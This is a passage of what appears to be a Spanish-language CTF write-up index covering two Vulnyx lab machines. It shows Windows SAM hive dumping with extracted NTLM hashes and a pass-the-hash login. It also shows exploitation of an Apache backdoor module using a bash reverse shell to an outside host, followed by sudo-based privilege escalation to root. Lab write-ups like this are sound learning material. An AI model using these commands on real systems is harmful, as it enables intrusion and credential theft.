de seguridad\n                                           *Usuarios\n                                           *Usuarios de administr\nMiembros del grupo global                  *Ninguno\n\n*Evil-WinRM* PS C:\\Users\\j.wilson\\desktop&gt; cd c:\\\n*Evil-WinRM* PS C:\\&gt; mkdir temp\n*Evil-WinRM* PS C:\\&gt; reg save hklm\\sam c:\\temp\\sam.hives\n*Evil-WinRM* PS C:\\&gt; reg save hklm\\system c:\\temp\\system.hives\n*Evil-WinRM* PS C:\\&gt; download sam\n*Evil-WinRM* PS C:\\&gt; download system\n\n# Extraemos los hashes \n\nimpacket-secretsdump -sam sam.hive -system system.hive LOCAL  \n[*] Target system bootKey: 0x827cc782adafc2fd1b7b7a48da1e20ba\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nInvitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8afe1e889d0977f8571b3dc0524648aa:::\nadministrator:1002:aad3b435b51404eeaad3b435b51404ee:41186fb28e283ff758bb3dbeb6fb4a5c:::\np.smith:1003:aad3b435b51404eeaad3b435b51404ee:2cf4020e126a3314482e5e87a3f39508:::\nf.miller:1004:aad3b435b51404eeaad3b435b51404ee:851699978beb72d9b0b820532f74de8d:::\nm.davis:1005:aad3b435b51404eeaad3b435b51404ee:851699978beb72d9b0b820532f74de8d:::\nj.wilson:1006:aad3b435b51404eeaad3b435b51404ee:a6cf5ad66b08624854e80a8786ad6bac:::\n[*] Cleaning up... \n\nTeniendo el hash, utilizamos pass-the-hash para conectar como administrator, ya que la cuenta Adminitrador est\u00e1 deshabilitada:\n\nevil-winrm -i 192.168.0.63 -u administrator -H 41186fb28e283ff758bb3dbeb6fb4a5c \n\n*Evil-WinRM* PS C:\\Users\\administrator\\desktop&gt;\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Hosting/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 La manera de escalar privilegios es correcta, pero no he logrado acceder mediante el pass-the-hash, a pesar de haber verificado con diferentes writeups el proceso y los hashes"},{"location":"Writeup-ctfs/Vulnyx/Infected/","title":"Infected","text":"<p>\ud83e\udde0 Plataforma: Vulnyx</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 27 de abril de 2025 20:11</p> <p>\ud83c\udf10 IP: <code>192.168.0.14</code></p>"},{"location":"Writeup-ctfs/Vulnyx/Infected/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Escanemos la red</p> <pre><code>sudo arp-scan -I eth0 --localnet \n\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n\n192.168.0.14    08:00:27:7a:1e:e8   PCS Systemtechnik GmbH\n</code></pre> <p>Identificamos el entorno mediante la MAC 08:00.. que corresponde al fabricante VirtualBox</p> <p>Identificamos sistema y vemos que por la respuesta del ttl del ping se trata de una maquina Linux</p> <pre><code>ping -c 2 192.168.0.14                                                                                                     \ue0b2 1 \u2718 \ue0b3 20:16:35 \uf017 \ue0b0\nPING 192.168.0.14 (192.168.0.14) 56(84) bytes of data.\n64 bytes from 192.168.0.14: icmp_seq=1 ttl=64 time=0.786 ms\n64 bytes from 192.168.0.14: icmp_seq=2 ttl=64 time=0.326 ms\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Infected/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.14 -oG targeted\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 64\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 08:00:27:7A:1E:E8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Infected/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>nmap -p22,80 -sCV 192.168.0.14 -oN targeted\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)\n| ssh-hostkey: \n|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)\n|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)\n80/tcp open  http    Apache httpd 2.4.57 ((Debian))\n|_http-server-header: Apache/2.4.57 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\nMAC Address: 08:00:27:7A:1E:E8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>22 Open SSH 9.2p1</li> <li>Apache httpd 2.4.57</li> </ul> </li> </ul> <p>Enumeramos servicio web </p> <p>Mediante fuzzing, buscamos directorios de la web</p> <pre><code>gobuster dir -u http://192.168.0.14 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt\n\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 277]\n/info.php             (Status: 200) [Size: 114390]\n</code></pre> <p>Enontramos un sitio llamado \u201cinfo.php\u201d que muestra:</p> <p></p> <p>Observamos que el nombre del sistema es Linux infected. Revisando los modulos cargados aparece uno con nombre : mod_backdoor</p> <p></p>"},{"location":"Writeup-ctfs/Vulnyx/Infected/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/Vulnyx/Infected/#mood_backdoor","title":"Mood_backdoor","text":"<p>Si buscamos informaci\u00f3n acerca de este m\u00f3dulo, encontramos que el sistema est\u00e1 infectado con una backdoor que nos permite ejecutar comandos mediante:</p> <pre><code>curl -sX GET -H \"Backdoor: command\" \"http://Target_IP\"\n</code></pre> <p>Por lo tanto, lo que vamos a hacer es intentar enviar una revershell para obtener acceso remoto</p> <pre><code># Local Machine\nnc -lvnp 4444\n\nReverShell: bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.115/4444 0&gt;&amp;1\n\ncurl -sX GET -H \"Backdoor: bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.115/4444 0&gt;&amp;1'\" \"http://192.168.0.14\"\n\nlistening on [any] 4444 ...\nconnect to [192.168.0.115] from (UNKNOWN) [192.168.0.14] 41110\nbash: cannot set terminal process group (452): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@infected:/$ \n</code></pre> <p>Hacemos el tratamiento de la tty</p> <pre><code>script -c bash /dev/null\nctr+z\n\nstty raw echo; fg\nreset xterm\n\nwww-data@infected:/$ export TERM=XTERM\nwww-data@infected:/$ export SHELL=BASH\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Infected/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"<p>Una vez dentro del sistema, vamos a listar que usuarios hay </p> <pre><code>www-data@infected:/home$ cat /etc/passwd | grep -e \"/bin/bash\"\nroot:x:0:0:root:/root:/bin/bash\nlaurent:x:1000:1000:laurent:/home/laurent:/bin/bash\n</code></pre> <p>Buscamos permisos con SUID</p> <pre><code>www-data@infected:/home$ sudo -l\nMatching Defaults entries for www-data on infected:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser www-data may run the following commands on infected:\n    (laurent) NOPASSWD: /usr/sbin/service\nwww-data@infected:/home$ \n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Infected/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Vemos que podemos usar el binario service como el usuario laurent, sin proporcionar credenciales. Lo usamos para migrar de usuario</p> <pre><code> www-data@infected:/usr/sbin$ sudo -u laurent service ../../bin/sh\n$ whoami\nlaurent\n$ script -c bash /dev/null\nlaurent@infected:/$ \nlaurent@infected:/home/laurent$ cat user.txt \n6b**************************c\n</code></pre> <p>Seguimos con la escalada de privilegios</p> <pre><code>laurent@infected:/$ sudo -l\nMatching Defaults entries for laurent on infected:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser laurent may run the following commands on infected:\n    (root) NOPASSWD: /usr/bin/joe\n</code></pre> <p>Vemos que podemos usar el binario joe para obtener una shell como usuario root mediante:</p> <pre><code>./joe\n^K!/bin/sh\n\nlaurent@infected:/home/laurent$ sudo /usr/bin/joe\ncntl+K\n!\nProgram to run: /bin/bash\nroot@infected:/# whoami\nroot\nroot@infected:/# \nroot@infected:~# cat root.txt \nff*****************3dc\n</code></pre>"},{"location":"Writeup-ctfs/Vulnyx/Infected/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 En esta secci\u00f3n, debes proporcionar un resumen de la m\u00e1quina para cuando tengas que volver a ella, puedas saber conocer de forma r\u00e1pida de que se trataba"}]}